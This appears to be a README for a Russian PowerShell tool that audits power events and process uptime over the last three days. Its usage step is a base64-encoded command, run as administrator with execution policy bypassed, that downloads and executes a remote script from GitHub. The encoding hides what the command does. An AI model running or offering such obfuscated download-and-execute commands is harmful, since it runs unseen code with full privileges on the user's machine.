
## PowerAuditLast3d

### Описание

Скрипт PowerShell для анализа стабильности системы за последние 3 дня. Собирает критические события питания (включения, выключения, ошибки) и сопоставляет их с текущим временем работы системы и ключевых процессов.

### Особенности

* **Ретроспективный анализ:** Извлекает из журнала «System» события за последние 72 часа по конкретному списку ID (41, 6008, 1074 и др.).
* **Контроль аптайма:** Вычисляет точное время последней загрузки ОС и общее время работы системы.
* **Мониторинг процессов:** Отслеживает время запуска и аптайм критических процессов (`winlogon`, `explorer`, `java`).

### Использование

Для запуска скопируйте и вставьте команду ниже в консоль PowerShell (требуются права администратора для доступа к системным логам и процессам):

```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AYQBkAGUAbABpAG4AcQB1AGUAbgB0AC8AUwBjAHIAZQBlAG4AUwBoAGEAcgBlAFAAUwAvAHIAZQBmAHMALwBoAGUAYQBkAHMALwBtAGEAaQBuAC8AVQBwAHQAaQBtAGUAQQB1AGQAaQB0AC8AVQBwAHQAaQBtAGUAQQB1AGQAaQB0AC4AcABzADEAJwApAA==
```

---

### Известные проблемы

**В PowerShell не вставляются символы верхнего регистра**

**Причина**
В некорректно работающем модуле **PSReadLine**, именно он отвечает в PowerShell за расширенные возможности форматирования содержимого консоли, а также за копирование и вставку в консоль текста из буфера обмена с использованием мышки. Проблема лежит на стороне разработчиков, так что простым пользователям ничего не остается как установить в систему соответствующее обновление PSReadLine.

**Варианты решения**

* Вместо мышки используйте для вставки скопированных команд комбинацию клавиш **Ctrl + V**.
* Если у вас ноутбук, вместо правой клавиши мыши нажмите соответствующую ей область на тачпаде.
* Если у вас включена английская раскладка, переключитесь на русскую (если команда содержит заглавные символы кириллицей, они будут обрезаны. То есть работает этот трюк только с английскими символами).
* Переустановить проблемный модуль PSReadLine (недопустимо в системе проверяемого, только для исправления на своем ПК).

**Инструкция по переустановке**

1. В запущенной от имени администратора командной строке выполните:
```powershell
Remove-Module PSReadLine -Force

```


2. Перейдите в расположение:
`C:\Program Files\WindowsPowerShell\Modules`
3. Удалите папку **PSReadLine**.
4. Выполните команду:
```powershell
Install-Module PSReadLine -Force -AllowClobber

```


Подтвердите инсталляцию вводом **Y**.
5. Перезапустите PowerShell.
